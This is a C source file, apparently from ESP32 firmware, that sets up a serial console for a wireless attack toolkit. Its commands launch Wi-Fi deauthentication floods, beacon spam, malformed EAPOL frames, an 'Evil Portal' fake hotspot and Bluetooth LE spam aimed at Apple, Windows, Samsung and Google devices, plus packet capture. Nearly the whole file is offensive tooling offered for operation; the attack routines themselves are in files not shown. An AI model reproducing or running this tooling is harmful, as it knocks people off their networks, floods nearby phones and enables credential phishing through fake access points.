#include "cli.h"
#include "wifi_attack.h"
#include "ble_attack.h"
#include "pcap.h"
#include "evil_portal.h"
#include "esp_console.h"
#include "esp_log.h"
#include "argtable3/argtable3.h"
#include "nvs_flash.h"
#include "esp_system.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "cli";

/* ── Banner ──────────────────────────────────────────────────────────── */
static const char *BANNER =
    "\n"
    "  _     _                                  _     _\n"
    " | |__ (_)_ __   __ _ _ __ _   _       _ __ ___ (_)___| |_\n"
    " | '_ \\| | '_ \\ / _` | '__| | | |_____| '_ ` _ \\| / __| __|\n"
    " | |_) | | | | | (_| | |  | |_| |_____| | | | | | \\__ \\ |_\n"
    " |_.__/|_|_| |_|\\__,_|_|   \\__, |     |_| |_| |_|_|___/\\__|\n"
    "                            |___/    ESP-IDF 6.0.1  pure C\n\n"
    " Type 'help' for commands.\n\n";

/* ── WiFi commands ───────────────────────────────────────────────────── */

static struct {
    struct arg_int *channel;
    struct arg_str *ssid;
    struct arg_int *count;
    struct arg_end *end;
} deauth_args;

static int cmd_deauth(int argc, char **argv)
{
    int nerrors = arg_parse(argc, argv, (void **)&deauth_args);
    if (nerrors) { arg_print_errors(stdout, deauth_args.end, argv[0]); return 1; }

    uint8_t bssid[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t dst[6]   = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t ch  = deauth_args.channel->count ? (uint8_t)deauth_args.channel->ival[0] : 6;
    uint8_t cnt = deauth_args.count->count   ? (uint8_t)deauth_args.count->ival[0]   : 10;

    wifi_attack_init();
    wifi_attack_send_deauth(bssid, dst, ch, cnt);
    printf("Sent %d deauth frames on ch %d\n", cnt, ch);
    return 0;
}

static struct {
    struct arg_str *ssid;
    struct arg_int *channel;
    struct arg_end *end;
} beacon_args;

static int cmd_beacon(int argc, char **argv)
{
    int nerrors = arg_parse(argc, argv, (void **)&beacon_args);
    if (nerrors) { arg_print_errors(stdout, beacon_args.end, argv[0]); return 1; }

    const char *ssid = beacon_args.ssid->count ? beacon_args.ssid->sval[0] : NULL;
    uint8_t ch = beacon_args.channel->count ? (uint8_t)beacon_args.channel->ival[0] : 6;

    wifi_attack_init();
    if (ssid) {
        wifi_attack_beacon_spam(ssid, ch, true);
        printf("Beacon spam: '%s' on ch %d\n", ssid, ch);
    } else {
        wifi_attack_beacon_rand_ssid(ch);
        printf("Random beacon on ch %d\n", ch);
    }
    return 0;
}

static int cmd_scan_ap(int argc, char **argv)
{
    (void)argc; (void)argv;
    wifi_attack_init();
    wifi_attack_start_promiscuous(wifi_attack_beacon_sniffer_cb);
    printf("AP scan started — press Ctrl+C to stop\n");
    return 0;
}

static int cmd_scan_raw(int argc, char **argv)
{
    (void)argc; (void)argv;
    wifi_attack_init();
    wifi_attack_start_promiscuous(wifi_attack_ap_sniffer_cb);
    printf("Raw capture started — press Ctrl+C to stop\n");
    return 0;
}

static struct {
    struct arg_int *channel;
    struct arg_end *end;
} eapol_args;

static int cmd_eapol(int argc, char **argv)
{
    int nerrors = arg_parse(argc, argv, (void **)&eapol_args);
    if (nerrors) { arg_print_errors(stdout, eapol_args.end, argv[0]); return 1; }
    uint8_t bssid[6] = {0};
    uint8_t ch = eapol_args.channel->count ? (uint8_t)eapol_args.channel->ival[0] : 6;
    wifi_attack_init();
    wifi_attack_send_eapol_bad(bssid, ch);
    printf("EAPOL bad-msg sent on ch %d\n", ch);
    return 0;
}

static struct {
    struct arg_str *ssid;
    struct arg_end *end;
} portal_args;

static int cmd_portal(int argc, char **argv)
{
    int nerrors = arg_parse(argc, argv, (void **)&portal_args);
    if (nerrors) { arg_print_errors(stdout, portal_args.end, argv[0]); return 1; }
    const char *ssid = portal_args.ssid->count ? portal_args.ssid->sval[0] : "FreeWiFi";
    evil_portal_start(ssid, NULL);
    printf("Evil Portal up: SSID='%s'\n", ssid);
    return 0;
}

static int cmd_stop(int argc, char **argv)
{
    (void)argc; (void)argv;
    wifi_attack_stop_promiscuous();
    wifi_attack_deinit();
    evil_portal_stop();
    ble_attack_stop_scan();
    printf("All attacks stopped\n");
    return 0;
}

/* ── BLE commands ────────────────────────────────────────────────────── */

static int cmd_ble_scan(int argc, char **argv)
{
    (void)argc; (void)argv;
    ble_attack_init();
    ble_attack_start_scan(NULL);
    printf("BLE scan started\n");
    return 0;
}

static int cmd_ble_sour_apple(int argc, char **argv)
{
    (void)argc; (void)argv;
    ble_attack_init();
    ble_attack_sour_apple();
    printf("Sour Apple sent\n");
    return 0;
}

static int cmd_ble_swiftpair(int argc, char **argv)
{
    (void)argc; (void)argv;
    ble_attack_init();
    ble_attack_swiftpair();
    printf("SwiftPair sent\n");
    return 0;
}

static int cmd_ble_spam_all(int argc, char **argv)
{
    (void)argc; (void)argv;
    ble_attack_init();
    ble_attack_sour_apple();
    ble_attack_swiftpair();
    ble_attack_samsung();
    ble_attack_google();
    printf("BLE spam all sent\n");
    return 0;
}

/* ── Stats ───────────────────────────────────────────────────────────── */
static int cmd_stats(int argc, char **argv)
{
    (void)argc; (void)argv;
    printf("WiFi TX: %lu  RX: %lu\n",
           (unsigned long)wifi_attack_packets_sent(),
           (unsigned long)wifi_attack_packets_rx());
    printf("BLE TX:  %lu\n", (unsigned long)ble_attack_frames_sent());
    printf("5GHz:    %s\n", wifi_attack_has_5ghz() ? "supported" : "not supported");
    return 0;
}

static int cmd_channel(int argc, char **argv)
{
    if (argc < 2) {
        printf("current channel: %d\n", wifi_attack_get_channel());
        return 0;
    }
    uint8_t ch = (uint8_t)atoi(argv[1]);
    wifi_attack_set_channel(ch);
    printf("channel set to %d\n", ch);
    return 0;
}

static int cmd_reboot(int argc, char **argv)
{
    (void)argc; (void)argv;
    printf("Rebooting...\n");
    esp_restart();
    return 0;
}

/* ── Registration ────────────────────────────────────────────────────── */
esp_err_t cli_init(void)
{
    esp_console_config_t cfg = {
        .max_cmdline_length = 256,
        .max_cmdline_args   = 8,
        .hint_color         = 36,
    };
    ESP_ERROR_CHECK(esp_console_init(&cfg));

    esp_console_register_help_command();

    /* deauth */
    deauth_args.channel = arg_int0("c", "channel", "<ch>", "WiFi channel (default 6)");
    deauth_args.count   = arg_int0("n", "count",   "<n>",  "Frame count (default 10)");
    deauth_args.end     = arg_end(2);
    esp_console_cmd_t d = { .command="deauth", .help="Send deauth frames",
                             .func=cmd_deauth, .argtable=&deauth_args };
    esp_console_cmd_register(&d);

    /* beacon */
    beacon_args.ssid    = arg_str0("s", "ssid",    "<ssid>",   "SSID (random if omitted)");
    beacon_args.channel = arg_int0("c", "channel", "<ch>",     "Channel (default 6)");
    beacon_args.end     = arg_end(2);
    esp_console_cmd_t b = { .command="beacon", .help="Beacon spam",
                             .func=cmd_beacon, .argtable=&beacon_args };
    esp_console_cmd_register(&b);

    /* eapol */
    eapol_args.channel = arg_int0("c", "channel", "<ch>", "Channel (default 6)");
    eapol_args.end     = arg_end(1);
    esp_console_cmd_t e = { .command="eapol", .help="EAPOL bad-message attack",
                             .func=cmd_eapol, .argtable=&eapol_args };
    esp_console_cmd_register(&e);

    /* evil portal */
    portal_args.ssid = arg_str0("s", "ssid", "<ssid>", "AP SSID (default FreeWiFi)");
    portal_args.end  = arg_end(1);
    esp_console_cmd_t p = { .command="portal", .help="Start Evil Portal",
                             .func=cmd_portal, .argtable=&portal_args };
    esp_console_cmd_register(&p);

    esp_console_cmd_t cmds[] = {
        { .command="scan_ap",      .help="Passive AP/beacon scan",   .func=cmd_scan_ap },
        { .command="scan_raw",     .help="Raw promiscuous capture",   .func=cmd_scan_raw },
        { .command="stop",         .help="Stop all attacks",          .func=cmd_stop },
        { .command="ble_scan",     .help="BLE passive scan",          .func=cmd_ble_scan },
        { .command="sour_apple",   .help="BLE Sour Apple attack",     .func=cmd_ble_sour_apple },
        { .command="swiftpair",    .help="BLE SwiftPair spam",        .func=cmd_ble_swiftpair },
        { .command="ble_spam",     .help="BLE spam all vectors",      .func=cmd_ble_spam_all },
        { .command="stats",        .help="Print packet stats",        .func=cmd_stats },
        { .command="channel",      .help="Get/set WiFi channel",      .func=cmd_channel },
        { .command="reboot",       .help="Reboot device",             .func=cmd_reboot },
    };
    for (int i = 0; i < (int)(sizeof(cmds)/sizeof(cmds[0])); i++)
        esp_console_cmd_register(&cmds[i]);

    ESP_LOGI(TAG, "CLI initialized (%zu commands registered)",
             sizeof(cmds)/sizeof(cmds[0]) + 5);
    return ESP_OK;
}

void cli_task(void *arg)
{
    printf("%s", BANNER);

    esp_console_repl_t      *repl      = NULL;
    esp_console_repl_config_t repl_cfg = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
    repl_cfg.prompt = "bm> ";

    esp_console_dev_uart_config_t uart_cfg = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&uart_cfg, &repl_cfg, &repl));
    ESP_ERROR_CHECK(esp_console_start_repl(repl));

    /* esp_console_start_repl blocks — task keeps running via REPL loop */
    vTaskDelete(NULL);
}
